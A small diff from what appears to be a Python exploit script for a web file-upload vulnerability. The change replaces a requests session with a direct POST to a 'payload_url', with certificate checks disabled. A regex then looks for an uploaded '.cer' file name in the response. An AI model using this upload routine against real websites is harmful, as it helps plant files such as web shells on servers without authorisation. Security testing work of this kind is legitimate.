@@ -84,9 +84,7 @@ Content-Disposition: form-data; name="img_vspace"
             'Content-Type': 'application/x-www-form-urlencoded',
             'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8'
         }
-
-        s = requests.session()
-        resp = s.post(payload_url,data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
+        resp = requests.post(payload_url,data=data,headers=headers,proxies=proxies, timeout=6, verify=False)
         con = resp.text
         match = re.search(r'getimg\(\'([\d]+.cer)\'\)', con)
         if match:
